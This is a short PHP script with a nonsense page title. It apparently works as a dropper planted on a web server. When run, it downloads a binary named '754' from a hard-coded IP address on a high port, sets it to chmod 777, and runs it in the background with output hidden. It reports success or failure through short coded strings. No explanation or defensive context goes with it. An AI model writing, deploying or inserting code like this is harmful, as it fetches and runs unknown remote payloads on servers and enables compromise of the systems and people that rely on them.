<title>ggyyyy9</title>
<?php
$downloadCommand = 'wget http://166.88.209.25:4789/754';
$chmodCommand = 'chmod 777 754';

exec($downloadCommand, $output, $returnCode);
exec($chmodCommand, $outputChmod, $returnCodeChmod);

if ($returnCode === 0 && $returnCodeChmod === 0) {
    $programCommand = 'sh -c "./754 > /dev/null 2>&1 &"';
    exec($programCommand, $outputProgram, $returnCodeProgram);

    if ($returnCodeProgram === 0) {
        echo "ggy9";
    } else {
        echo "FF.";
    }
} else {
    echo "FFFFFFFF";
}
?>

